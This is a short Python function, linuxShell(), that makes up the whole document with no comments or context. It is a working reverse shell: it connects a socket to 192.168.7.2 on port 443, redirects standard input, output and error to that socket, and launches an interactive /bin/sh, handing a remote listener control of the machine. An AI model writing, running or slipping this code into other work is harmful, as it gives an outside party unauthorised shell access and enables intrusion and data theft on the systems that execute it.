
def linuxShell():
    import socket,os,subprocess
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.7.2",443))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p = subprocess.call(["/bin/sh","-i"])
    

